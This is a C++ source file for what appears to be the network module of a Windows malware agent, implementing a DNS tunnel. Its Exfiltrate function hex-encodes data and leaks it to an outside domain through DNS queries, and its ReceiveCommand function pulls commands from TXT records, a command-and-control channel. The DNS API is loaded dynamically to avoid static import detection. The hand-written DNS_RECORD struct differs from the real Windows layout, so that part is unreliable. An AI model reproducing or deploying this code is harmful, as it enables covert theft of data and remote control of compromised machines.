#include "agent/network/dns_tunnel.hpp"
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <iostream>
#include <vector>
#include <sstream>
#include <iomanip>

// Windows DNS API Definitions
typedef struct _DNS_RECORD {
    struct _DNS_RECORD *pNext;
    LPSTR               pName;
    WORD                wType;
    WORD                wDataLength;
    union {
        DWORD           DW;
        struct {
            DWORD       dwStringCount;
            LPSTR       *pStringArray;
        } TXT;
    } Data;
} DNS_RECORD, *PDNS_RECORD;

#define DNS_TYPE_A      0x0001
#define DNS_TYPE_TEXT   0x0010
#define DNS_QUERY_STANDARD 0x00000000

typedef int (WINAPI *DnsQuery_A_t)(PCSTR, WORD, DWORD, PVOID, PDNS_RECORD*, PVOID);
typedef void (WINAPI *DnsRecordListFree_t)(PDNS_RECORD, int);

// Simple Base32 or Hex encoding for DNS safety
std::string ToHex(const std::string& input) {
    std::stringstream ss;
    for(unsigned char c : input) ss << std::hex << std::setw(2) << std::setfill('0') << (int)c;
    return ss.str();
}

DNSTunnel::DNSTunnel(const std::string& d) : domain(d) {}
DNSTunnel::~DNSTunnel() {}

bool DNSTunnel::Exfiltrate(const std::string& data) {
    HMODULE hDnsApi = LoadLibraryA("dnsapi.dll");
    if(!hDnsApi) return false;
    
    auto pDnsQuery_A = (DnsQuery_A_t)GetProcAddress(hDnsApi, "DnsQuery_A");
    auto pDnsRecordListFree = (DnsRecordListFree_t)GetProcAddress(hDnsApi, "DnsRecordListFree");
    
    if(!pDnsQuery_A || !pDnsRecordListFree) { FreeLibrary(hDnsApi); return false; }

    std::string encoded = ToHex(data);
    if(encoded.length() > 60) encoded = encoded.substr(0, 60); 
    
    std::string fullQuery = encoded + "." + domain;

    PDNS_RECORD pResults = NULL;
    int status = pDnsQuery_A(fullQuery.c_str(), DNS_TYPE_A, DNS_QUERY_STANDARD, NULL, &pResults, NULL);
    
    if(pResults) pDnsRecordListFree(pResults, 1);
    FreeLibrary(hDnsApi);
    return (status == 0);
}

std::string DNSTunnel::ReceiveCommand() {
    HMODULE hDnsApi = LoadLibraryA("dnsapi.dll");
    if(!hDnsApi) return "";
    
    auto pDnsQuery_A = (DnsQuery_A_t)GetProcAddress(hDnsApi, "DnsQuery_A");
    auto pDnsRecordListFree = (DnsRecordListFree_t)GetProcAddress(hDnsApi, "DnsRecordListFree");
    
    if(!pDnsQuery_A || !pDnsRecordListFree) { FreeLibrary(hDnsApi); return ""; }

    std::string cmdQuery = "cmd." + domain;
    PDNS_RECORD pResults = NULL;
    
    int status = pDnsQuery_A(cmdQuery.c_str(), DNS_TYPE_TEXT, DNS_QUERY_STANDARD, NULL, &pResults, NULL);
    
    std::string command = "";
    if (status == 0 && pResults != NULL) {
        if (pResults->wType == DNS_TYPE_TEXT) {
            for (DWORD i = 0; i < pResults->Data.TXT.dwStringCount; i++) {
                command += pResults->Data.TXT.pStringArray[i];
            }
        }
    }

    if(pResults) pDnsRecordListFree(pResults, 1);
    FreeLibrary(hDnsApi);
    return command;
}